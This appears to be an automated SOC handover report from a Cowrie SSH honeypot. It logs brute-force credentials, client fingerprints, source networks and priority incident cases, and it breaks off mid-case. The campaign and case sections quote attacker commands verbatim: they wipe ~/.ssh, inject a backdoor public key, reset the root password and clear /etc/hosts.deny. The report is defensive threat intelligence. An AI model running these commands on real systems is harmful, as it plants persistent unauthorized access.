# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-15 |
| **Generated At** | 2026-04-15T06:03:30Z |
| **Shift Time** | 06:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **295** |
| Confirmed Threats | **290** |
| False Positives Filtered | **5** (1.7%) |
| Unique Attacker IPs | **32** |
| Countries of Origin | **11** |
| High Severity Cases | **88** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **207** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **201** |
| Unique Credential Pairs | **119** |
| Unique Usernames | **47** |
| Unique Passwords | **113** |
| Successful Auth Pairs | **61** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 88 |
| `345gs5662d34` | 39 |
| `ubuntu` | 12 |
| `test` | 5 |
| `admin` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 39 |
| `3245gs5662d34` | 39 |
| `123456` | 5 |
| `123` | 3 |
| `123qweqwe` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 39 |
| `root` | `3245gs5662d34` | 39 |
| `root` | `123qweqwe` | 2 |
| `root` | `12345@QWER` | 2 |
| `ftpuser` | `ftpuser` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qazwsx!!` | `120.133.52.228` | 2026-04-15T02:50:52 |
| `root` | `!Q2w3e4r` | `101.36.107.152` | 2026-04-15T03:30:01 |
| `root` | `123qweqwe` | `94.23.30.215` | 2026-04-15T04:08:38 |
| `root` | `3245gs5662d34` | `94.23.30.215` | 2026-04-15T04:08:42 |
| `root` | `a123456zh` | `60.178.13.241` | 2026-04-15T04:09:25 |
| `root` | `Royal@123` | `58.222.244.226` | 2026-04-15T04:10:00 |
| `root` | `3245gs5662d34` | `58.222.244.226` | 2026-04-15T04:10:04 |
| `root` | `12345@QWER` | `180.184.82.249` | 2026-04-15T04:10:38 |
| `root` | `3245gs5662d34` | `180.184.82.249` | 2026-04-15T04:10:48 |
| `root` | `root321#` | `101.126.89.35` | 2026-04-15T04:11:48 |
| `root` | ``1234qwer` | `43.153.12.68` | 2026-04-15T04:12:04 |
| `root` | `3245gs5662d34` | `43.153.12.68` | 2026-04-15T04:12:10 |
| `root` | `123321` | `43.153.12.68` | 2026-04-15T04:12:39 |
| `root` | `QWERTYUIOP!` | `14.103.120.138` | 2026-04-15T04:14:29 |
| `root` | `alexander` | `43.153.12.68` | 2026-04-15T04:15:04 |
| `root` | `aa123456789bb` | `14.103.120.138` | 2026-04-15T04:16:15 |
| `root` | `qwer4444` | `43.153.12.68` | 2026-04-15T04:16:22 |
| `root` | `3245gs5662d34` | `14.103.120.138` | 2026-04-15T04:16:23 |
| `root` | `root3` | `46.188.119.26` | 2026-04-15T04:17:52 |
| `root` | `3245gs5662d34` | `46.188.119.26` | 2026-04-15T04:17:56 |
| `root` | `1Qwert` | `43.153.12.68` | 2026-04-15T04:20:08 |
| `root` | `Qazwsx111#` | `46.188.119.26` | 2026-04-15T04:21:04 |
| `root` | `Rs123456` | `14.103.120.138` | 2026-04-15T04:21:42 |
| `root` | `123qweqwe` | `46.188.119.26` | 2026-04-15T04:22:11 |
| `root` | `qazwsx666..` | `14.103.114.205` | 2026-04-15T04:23:16 |
| `root` | `1qaz@WSX3edc$RFV!@#` | `46.188.119.26` | 2026-04-15T04:23:18 |
| `root` | `Pa$$w0rd@123` | `43.153.12.68` | 2026-04-15T04:23:26 |
| `root` | `Qazwsx112233!@` | `43.153.12.68` | 2026-04-15T04:24:43 |
| `root` | `root000!` | `46.188.119.26` | 2026-04-15T04:25:26 |
| `root` | `Root4321#$` | `46.188.119.26` | 2026-04-15T04:26:33 |
| `root` | `admin1234@@` | `46.188.119.26` | 2026-04-15T04:28:50 |
| `root` | `123@ASDF` | `46.188.119.26` | 2026-04-15T04:32:09 |
| `root` | `123456@Aa` | `46.188.119.26` | 2026-04-15T04:33:13 |
| `root` | `21ops.com` | `46.188.119.26` | 2026-04-15T04:34:19 |
| `root` | `qwe999` | `46.188.119.26` | 2026-04-15T04:37:41 |
| `root` | `p0o9i8u7y6t5` | `46.188.119.26` | 2026-04-15T04:38:45 |
| `root` | `Qwertyuiop!@#` | `14.103.114.205` | 2026-04-15T05:04:41 |
| `root` | `3245gs5662d34` | `14.103.114.205` | 2026-04-15T05:04:47 |
| `root` | `12345@QWER` | `14.103.114.205` | 2026-04-15T05:11:59 |
| `root` | `A123456T` | `164.90.138.136` | 2026-04-15T05:22:47 |
| `root` | `3245gs5662d34` | `164.90.138.136` | 2026-04-15T05:22:52 |
| `root` | `ab123123` | `14.103.115.233` | 2026-04-15T05:25:31 |
| `root` | `3245gs5662d34` | `14.103.115.233` | 2026-04-15T05:25:37 |
| `root` | `!QAZ2wsx@123` | `187.51.208.158` | 2026-04-15T05:26:30 |
| `root` | `3245gs5662d34` | `187.51.208.158` | 2026-04-15T05:26:38 |
| `root` | `qwerty123.` | `101.126.54.36` | 2026-04-15T05:26:43 |
| `root` | `3245gs5662d34` | `101.126.54.36` | 2026-04-15T05:26:53 |
| `root` | `Qwer@4321` | `196.199.40.4` | 2026-04-15T05:27:35 |
| `root` | `3245gs5662d34` | `196.199.40.4` | 2026-04-15T05:27:39 |
| `root` | `qwerty2024` | `106.37.72.234` | 2026-04-15T05:30:29 |
| `root` | `1QAZ2wsx$` | `106.37.72.234` | 2026-04-15T05:31:33 |
| `root` | `Qwertyuiop123` | `196.199.40.4` | 2026-04-15T05:31:36 |
| `root` | `mm` | `196.199.40.4` | 2026-04-15T05:32:58 |
| `root` | `qwerty2024` | `101.126.54.36` | 2026-04-15T05:33:29 |
| `root` | `Aabb1122` | `101.126.54.36` | 2026-04-15T05:35:29 |
| `root` | `QWER!123456` | `196.199.40.4` | 2026-04-15T05:38:24 |
| `root` | `Admin2026#` | `196.199.40.4` | 2026-04-15T05:39:53 |
| `root` | `Xu123456` | `196.199.40.4` | 2026-04-15T05:42:40 |
| `root` | `qwertyui123` | `196.199.40.4` | 2026-04-15T05:45:25 |
| `root` | `Qq147258369` | `196.199.40.4` | 2026-04-15T05:46:49 |
| `root` | `Xx123456@` | `196.199.40.4` | 2026-04-15T05:49:29 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **295** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 278 |
| Go SSH scanner | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 273 | 21 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |
| `0a07365cc01f...` | Generic scanner | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 273 | 21 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 2 | — |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 2 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 6 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 39 | 12 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:sWzc0CH7CJ2H"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.114.205`, `101.126.89.35`, `106.37.72.234`, `14.103.120.138`, `120.133.52.228`, `60.178.13.241`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:rL6W4krLguKV"|chpasswd|bash
```
Source IPs: `106.37.72.234`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `180.184.82.249`, `187.51.208.158`, `14.103.114.205`, `58.222.244.226`, `46.188.119.26`, `101.126.54.36`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **32** |
| Unique ASNs | **22** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 6 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS10429` | TELEFÔNICA BRASIL S.A | 1 | HIGH |
| `AS263611` | ZUM TELECOM LTDA- ME | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (88)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5659a3ebf8e2

| Field | Detail |
|---|---|
| **Source IP** | `120.133.52[.]228` |
| **First Seen** | 2026-04-15 02:50 |
| **Last Seen** | 2026-04-15 02:51 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:sWzc0CH7CJ2H"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 02:50:51` | `cowrie.session.connect` |
| `2026-04-15 02:50:51` | `cowrie.client.version` |
| `2026-04-15 02:50:52` | `cowrie.client.kex` |
| `2026-04-15 02:50:52` | `cowrie.login.success` |
| `2026-04-15 02:50:52` | `cowrie.session.params` |
| `2026-04-15 02:50:52` | `cowrie.command.input` |
| `2026-04-15 02:50:52` | `cowrie.command.failed` |
| `2026-04-15 02:50:53` | `cowrie.log.closed` |
| `2026-04-15 02:50:53` | `cowrie.session.params` |
| `2026-04-15 02:50:53` | `cowrie.command.input` |
| `2026-04-15 02:50:53` | `cowrie.session.file_download` |
| `2026-04-15 02:50:53` | `cowrie.log.closed` |
| `2026-04-15 02:51:09` | `cowrie.session.params` |
| `2026-04-15 02:51:09` | `cowrie.command.input` |
| `2026-04-15 02:51:09` | `cowrie.log.closed` |
| `2026-04-15 02:51:10` | `cowrie.session.params` |
| `2026-04-15 02:51:10` | `cowrie.command.input` |
| `2026-04-15 02:51:10` | `cowrie.log.closed` |
| `2026-04-15 02:51:10` | `cowrie.session.params` |
| `2026-04-15 02:51:10` | `cowrie.command.input` |
| `2026-04-15 02:51:10` | `cowrie.session.file_download` |
| `2026-04-15 02:51:10` | `cowrie.log.closed` |
| `2026-04-15 02:51:11` | `cowrie.session.params` |
| `2026-04-15 02:51:11` | `cowrie.command.input` |
| `2026-04-15 02:51:11` | `cowrie.log.closed` |
| `2026-04-15 02:51:11` | `cowrie.session.params` |
| `2026-04-15 02:51:11` | `cowrie.command.input` |
| `2026-04-15 02:51:11` | `cowrie.log.closed` |
| `2026-04-15 02:51:12` | `cowrie.session.params` |
| `2026-04-15 02:51:12` | `cowrie.command.input` |
| `2026-04-15 02:51:12` | `cowrie.command.input` |
| `2026-04-15 02:51:12` | `cowrie.log.closed` |
| `2026-04-15 02:51:12` | `cowrie.session.params` |
| `2026-04-15 02:51:12` | `cowrie.command.input` |
| `2026-04-15 02:51:12` | `cowrie.log.closed` |
| `2026-04-15 02:51:13` | `cowrie.session.params` |
| `2026-04-15 02:51:13` | `cowrie.command.input` |
| `2026-04-15 02:51:13` | `cowrie.log.closed` |
| `2026-04-15 02:51:13` | `cowrie.session.params` |
| `2026-04-15 02:51:13` | `cowrie.command.input` |
| `2026-04-15 02:51:13` | `cowrie.log.closed` |
| `2026-04-15 02:51:14` | `cowrie.session.params` |
| `2026-04-15 02:51:14` | `cowrie.command.input` |
| `2026-04-15 02:51:14` | `cowrie.log.closed` |
| `2026-04-15 02:51:14` | `cowrie.session.params` |
| `2026-04-15 02:51:14` | `cowrie.command.input` |
| `2026-04-15 02:51:14` | `cowrie.log.closed` |
| `2026-04-15 02:51:15` | `cowrie.session.params` |
| `2026-04-15 02:51:15` | `cowrie.command.input` |
| `2026-04-15 02:51:15` | `cowrie.log.closed` |
| `2026-04-15 02:51:15` | `cowrie.session.params` |
| `2026-04-15 02:51:15` | `cowrie.command.input` |
| `2026-04-15 02:51:15` | `cowrie.log.closed` |
| `2026-04-15 02:51:16` | `cowrie.session.params` |
| `2026-04-15 02:51:16` | `cowrie.command.input` |
| `2026-04-15 02:51:16` | `cowrie.log.closed` |
| `2026-04-15 02:51:16` | `cowrie.session.params` |
| `2026-04-15 02:51:16` | `cowrie.command.input` |
| `2026-04-15 02:51:16` | `cowrie.log.closed` |
| `2026-04-15 02:51:17` | `cowrie.session.params` |
| `2026-04-15 02:51:17` | `cowrie.command.input` |
| `2026-04-15 02:51:17` | `cowrie.log.closed` |
| `2026-04-15 02:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.133.52[.]228` to AbuseIPDB if not already reported
- [ ] Block `120.133.52[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebc2370535be

| Field | Detail |
|---|---|
| **Source IP** | `101.36.107[.]152` |
| **First Seen** | 2026-04-15 03:30 |
| **Last Seen** | 2026-04-15 03:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 03:30:01` | `cowrie.session.connect` |
| `2026-04-15 03:30:01` | `cowrie.client.version` |
| `2026-04-15 03:30:01` | `cowrie.client.kex` |
| `2026-04-15 03:30:01` | `cowrie.login.success` |
| `2026-04-15 03:30:01` | `cowrie.session.params` |
| `2026-04-15 03:30:01` | `cowrie.command.input` |
| `2026-04-15 03:30:01` | `cowrie.log.closed` |
| `2026-04-15 03:30:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.107[.]152` to AbuseIPDB if not already reported
- [ ] Block `101.36.107[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d8b4cb9e853

| Field | Detail |
|---|---|
| **Source IP** | `94.23.30[.]215` |
| **First Seen** | 2026-04-15 04:08 |
| **Last Seen** | 2026-04-15 04:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:08:37` | `cowrie.session.connect` |
| `2026-04-15 04:08:37` | `cowrie.client.version` |
| `2026-04-15 04:08:38` | `cowrie.client.kex` |
| `2026-04-15 04:08:38` | `cowrie.login.success` |
| `2026-04-15 04:08:39` | `cowrie.session.params` |
| `2026-04-15 04:08:39` | `cowrie.command.input` |
| `2026-04-15 04:08:39` | `cowrie.command.failed` |
| `2026-04-15 04:08:39` | `cowrie.log.closed` |
| `2026-04-15 04:08:39` | `cowrie.session.params` |
| `2026-04-15 04:08:39` | `cowrie.command.input` |
| `2026-04-15 04:08:39` | `cowrie.session.file_download` |
| `2026-04-15 04:08:39` | `cowrie.log.closed` |
| `2026-04-15 04:08:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.23.30[.]215` to AbuseIPDB if not already reported
- [ ] Block `94.23.30[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d18c0d8faa06

| Field | Detail |
|---|---|
| **Source IP** | `94.23.30[.]215` |
| **First Seen** | 2026-04-15 04:08 |
| **Last Seen** | 2026-04-15 04:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:08:41` | `cowrie.session.connect` |
| `2026-04-15 04:08:41` | `cowrie.client.version` |
| `2026-04-15 04:08:41` | `cowrie.client.kex` |
| `2026-04-15 04:08:42` | `cowrie.login.success` |
| `2026-04-15 04:08:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.23.30[.]215` to AbuseIPDB if not already reported
- [ ] Block `94.23.30[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3ec591cdece

| Field | Detail |
|---|---|
| **Source IP** | `60.178.13[.]241` |
| **First Seen** | 2026-04-15 04:09 |
| **Last Seen** | 2026-04-15 04:09 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:KY50ewvBUNpJ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:09:24` | `cowrie.session.connect` |
| `2026-04-15 04:09:24` | `cowrie.client.version` |
| `2026-04-15 04:09:24` | `cowrie.client.kex` |
| `2026-04-15 04:09:25` | `cowrie.login.success` |
| `2026-04-15 04:09:25` | `cowrie.session.params` |
| `2026-04-15 04:09:25` | `cowrie.command.input` |
| `2026-04-15 04:09:25` | `cowrie.command.failed` |
| `2026-04-15 04:09:25` | `cowrie.log.closed` |
| `2026-04-15 04:09:26` | `cowrie.session.params` |
| `2026-04-15 04:09:26` | `cowrie.command.input` |
| `2026-04-15 04:09:26` | `cowrie.session.file_download` |
| `2026-04-15 04:09:26` | `cowrie.log.closed` |
| `2026-04-15 04:09:42` | `cowrie.session.params` |
| `2026-04-15 04:09:42` | `cowrie.command.input` |
| `2026-04-15 04:09:42` | `cowrie.log.closed` |
| `2026-04-15 04:09:42` | `cowrie.session.params` |
| `2026-04-15 04:09:42` | `cowrie.command.input` |
| `2026-04-15 04:09:43` | `cowrie.log.closed` |
| `2026-04-15 04:09:43` | `cowrie.session.params` |
| `2026-04-15 04:09:43` | `cowrie.command.input` |
| `2026-04-15 04:09:43` | `cowrie.session.file_download` |
| `2026-04-15 04:09:43` | `cowrie.log.closed` |
| `2026-04-15 04:09:43` | `cowrie.session.params` |
| `2026-04-15 04:09:43` | `cowrie.command.input` |
| `2026-04-15 04:09:44` | `cowrie.log.closed` |
| `2026-04-15 04:09:44` | `cowrie.session.params` |
| `2026-04-15 04:09:44` | `cowrie.command.input` |
| `2026-04-15 04:09:44` | `cowrie.log.closed` |
| `2026-04-15 04:09:44` | `cowrie.session.params` |
| `2026-04-15 04:09:44` | `cowrie.command.input` |
| `2026-04-15 04:09:44` | `cowrie.command.input` |
| `2026-04-15 04:09:45` | `cowrie.log.closed` |
| `2026-04-15 04:09:45` | `cowrie.session.params` |
| `2026-04-15 04:09:45` | `cowrie.command.input` |
| `2026-04-15 04:09:45` | `cowrie.log.closed` |
| `2026-04-15 04:09:46` | `cowrie.session.params` |
| `2026-04-15 04:09:46` | `cowrie.command.input` |
| `2026-04-15 04:09:46` | `cowrie.log.closed` |
| `2026-04-15 04:09:46` | `cowrie.session.params` |
| `2026-04-15 04:09:46` | `cowrie.command.input` |
| `2026-04-15 04:09:46` | `cowrie.log.closed` |
| `2026-04-15 04:09:47` | `cowrie.session.params` |
| `2026-04-15 04:09:47` | `cowrie.command.input` |
| `2026-04-15 04:09:47` | `cowrie.log.closed` |
| `2026-04-15 04:09:47` | `cowrie.session.params` |
| `2026-04-15 04:09:47` | `cowrie.command.input` |
| `2026-04-15 04:09:47` | `cowrie.log.closed` |
| `2026-04-15 04:09:48` | `cowrie.session.params` |
| `2026-04-15 04:09:48` | `cowrie.command.input` |
| `2026-04-15 04:09:48` | `cowrie.log.closed` |
| `2026-04-15 04:09:48` | `cowrie.session.params` |
| `2026-04-15 04:09:48` | `cowrie.command.input` |
| `2026-04-15 04:09:48` | `cowrie.log.closed` |
| `2026-04-15 04:09:49` | `cowrie.session.params` |
| `2026-04-15 04:09:49` | `cowrie.command.input` |
| `2026-04-15 04:09:49` | `cowrie.log.closed` |
| `2026-04-15 04:09:49` | `cowrie.session.params` |
| `2026-04-15 04:09:49` | `cowrie.command.input` |
| `2026-04-15 04:09:49` | `cowrie.log.closed` |
| `2026-04-15 04:09:50` | `cowrie.session.params` |
| `2026-04-15 04:09:50` | `cowrie.command.input` |
| `2026-04-15 04:09:50` | `cowrie.log.closed` |
| `2026-04-15 04:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.178.13[.]241` to AbuseIPDB if not already reported
- [ ] Block `60.178.13[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcf6deba9305

| Field | Detail |
|---|---|
| **Source IP** | `58.222.244[.]226` |
| **First Seen** | 2026-04-15 04:09 |
| **Last Seen** | 2026-04-15 04:10 |
